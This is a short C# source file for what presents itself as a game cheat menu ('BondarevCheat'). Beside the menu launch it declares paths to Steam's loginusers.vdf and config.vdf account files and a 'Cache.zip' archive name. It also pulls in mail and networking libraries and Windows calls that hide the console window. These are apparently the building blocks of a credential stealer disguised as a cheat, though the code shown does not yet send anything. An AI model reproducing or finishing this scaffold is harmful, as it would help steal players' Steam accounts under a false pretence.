using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace BondarevCheat
{
    public class Menu
    {
        /// /////////////////////////////////////////////////////////////////////////////
        ///                                                                           ///
        ///                               ///
        public static string ZIP = "Cache.zip";                                       ///
                                                                                      ///
                                                                                      ///                                                                           ///
                                                                                      /// /////////////////////////////////////////////////////////////////////////////

        public static string steamFolder = "";
        public static FileInfo steamCopyFile1 = new FileInfo(steamFolder + @"config\loginusers.vdf");
        public static FileInfo steamCopyFile2 = new FileInfo(steamFolder + @"config\config.vdf");
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        [STAThread]

        public static void Main()
        {
            
            returnMenu:

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new menu());


        }

    }
}
